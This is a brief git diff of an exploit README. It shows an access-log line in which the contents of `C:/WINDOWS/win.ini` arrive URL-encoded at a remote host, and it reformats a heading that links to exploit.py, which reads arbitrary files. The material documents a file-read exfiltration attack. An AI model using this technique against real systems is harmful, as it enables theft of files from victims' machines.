@@ -74,9 +74,7 @@ The contents of the local file, `C:/WINDOWS/win.ini` in the example, are then se
 $RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /EX?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1%0D%0A[MCI%20Extensions.BAK]%0D%0A3g2=MPEGVideo%0D%0A3gp=MPEGVideo%0D%0A3gp2=MPEGVideo%0D%0A3gpp=MPEGVideo%0D%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo%0D%0Amod=MPEGVideo%0D%0Amov=MPEGVideo%0D%0Amp4=MPEGVideo%0D%0Amp4v=MPEGVideo%0D%0Amts=MPEGVideo%0D%0Ats=MPEGVideo%0D%0Atts=MPEGVideo HTTP/1.1" 404 438 "-" "-"
 ~~~
 
-## Exploit
-
-* [exploit](exploit.py) 
+## [Exploit](exploit.py)
 
 Requests the contents of specified files (or `C:/Windows/win.ini` by default). It then writes the files to the current folder:
 
